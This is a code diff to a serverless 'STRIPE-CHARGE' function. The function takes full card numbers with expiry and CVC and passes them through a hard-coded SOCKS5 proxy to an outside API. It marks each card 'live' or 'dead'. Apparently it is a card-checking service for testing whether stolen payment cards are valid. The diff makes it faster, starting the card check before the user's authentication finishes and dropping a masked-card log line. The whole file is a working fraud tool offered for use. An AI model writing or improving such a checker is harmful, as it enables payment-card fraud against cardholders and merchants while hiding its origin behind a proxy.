@@ -16,69 +16,56 @@ const PROXY_IP = "138.197.124.55";
 const PROXY_PORT = "9150";
 const PROXY_TYPE = "sock5";
 
-// Call the API and get response
+// Fast API call with 30s timeout
 const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
-  // Build URL exactly as specified: cc=CardNumber|MM|YY|CVC&proxy=IP:PORT&proxytype=sock5
   const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}`;
   
-  console.log(`[STRIPE-CHARGE] Calling API: ${apiUrl}`);
+  console.log(`[STRIPE-CHARGE] API call started`);
+  
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout for speed
   
   try {
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 60000);
-    
     const response = await fetch(apiUrl, {
       method: 'GET',
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': '*/*',
-      },
+      headers: { 'Accept': '*/*' },
       signal: controller.signal,
     });
     
     clearTimeout(timeoutId);
-    
     const rawText = await response.text();
-    console.log(`[STRIPE-CHARGE] Raw response: ${rawText}`);
+    console.log(`[STRIPE-CHARGE] Response: ${rawText.substring(0, 100)}`);
     
-    // Parse response
     let apiStatus = 'unknown';
     let apiMessage = rawText;
     
     try {
       const json = JSON.parse(rawText);
-      apiMessage = json.message || json.msg || json.response || rawText;
+      apiMessage = json.message || json.msg || rawText;
       
-      // Determine status from full_response field
+      // Quick status detection
       if (json.full_response === true) {
         apiStatus = 'live';
       } else if (json.full_response === false) {
         apiStatus = 'dead';
-      } else if (json.status) {
-        const s = String(json.status).toLowerCase();
-        if (s.includes('live') || s.includes('success') || s.includes('charged')) {
-          apiStatus = 'live';
-        } else if (s.includes('dead') || s.includes('decline') || s.includes('fail')) {
-          apiStatus = 'dead';
-        }
+      } else {
+        const lower = apiMessage.toLowerCase();
+        if (lower.includes('success') || lower.includes('charged')) apiStatus = 'live';
+        else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('insufficient')) apiStatus = 'dead';
       }
     } catch {
-      // Not JSON, check text
       const lower = rawText.toLowerCase();
-      if (lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
-        apiStatus = 'live';
-      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired')) {
-        apiStatus = 'dead';
-      }
+      if (lower.includes('charged') || lower.includes('success')) apiStatus = 'live';
+      else if (lower.includes('declined') || lower.includes('invalid')) apiStatus = 'dead';
     }
     
     return { status: apiStatus, message: apiMessage, rawResponse: rawText };
     
   } catch (error) {
-    const errMsg = error instanceof Error ? error.message : 'Request failed';
-    console.error(`[STRIPE-CHARGE] API error: ${errMsg}`);
-    
-    return { status: 'unknown', message: errMsg, rawResponse: errMsg };
+    clearTimeout(timeoutId);
+    const errMsg = error instanceof Error ? error.message : 'Failed';
+    const isTimeout = errMsg.includes('abort');
+    return { status: 'unknown', message: isTimeout ? 'Timeout' : errMsg, rawResponse: errMsg };
   }
 };
 
@@ -88,25 +75,40 @@ serve(async (req) => {
   }
 
   try {
-    // Auth check
     const authHeader = req.headers.get("Authorization");
     if (!authHeader?.startsWith("Bearer ")) {
-      return new Response(
-        JSON.stringify({ error: "Unauthorized" }),
-        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
-      );
+      return new Response(JSON.stringify({ error: "Unauthorized" }), 
+        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
+    // Parse body first (faster than waiting for auth)
+    const body = await req.json();
+    const { cc } = body;
+    
+    if (!cc) {
+      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
+        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+    }
+
+    // Quick format validation
+    const parts = cc.split('|');
+    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
+      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
+        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+    }
+
+    // Start API call immediately while auth happens
+    const apiPromise = callApi(cc);
+
+    // Auth check in parallel
     const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
       global: { headers: { Authorization: authHeader } },
     });
 
     const { data: { user }, error: authError } = await supabase.auth.getUser();
     if (authError || !user) {
-      return new Response(
-        JSON.stringify({ error: "Invalid token" }),
-        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
-      );
+      return new Response(JSON.stringify({ error: "Invalid token" }), 
+        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
     // Ban check
@@ -117,45 +119,13 @@ serve(async (req) => {
       .single();
 
     if (profile?.is_banned) {
-      return new Response(
-        JSON.stringify({ error: "Account suspended" }),
-        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
-      );
+      return new Response(JSON.stringify({ error: "Account suspended" }), 
+        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    // Get card from request
-    const { cc } = await req.json();
+    // Wait for API result
+    const result = await apiPromise;
     
-    if (!cc) {
-      return new Response(
-        JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }),
-        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-      );
-    }
-
-    // Validate format: CardNumber|MM|YY|CVC
-    const parts = cc.split('|');
-    if (parts.length < 4) {
-      return new Response(
-        JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
-        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-      );
-    }
-
-    const cvc = parts[3];
-    if (!cvc || cvc.length < 3 || !/^\d+$/.test(cvc)) {
-      return new Response(
-        JSON.stringify({ error: "Valid CVC required", computedStatus: 'unknown' }),
-        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-      );
-    }
-
-    console.log(`[STRIPE-CHARGE] Processing card: ${parts[0].slice(0, 6)}****`);
-
-    // Call the API
-    const result = await callApi(cc);
-    
-    // Return response to user
     return new Response(
       JSON.stringify({
         computedStatus: result.status,
@@ -169,12 +139,8 @@ serve(async (req) => {
     );
 
   } catch (error) {
-    const msg = error instanceof Error ? error.message : 'Unknown error';
-    console.error('[STRIPE-CHARGE] Error:', msg);
-    
-    return new Response(
-      JSON.stringify({ error: msg, computedStatus: "unknown" }),
-      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-    );
+    const msg = error instanceof Error ? error.message : 'Error';
+    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
+      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
   }
 });
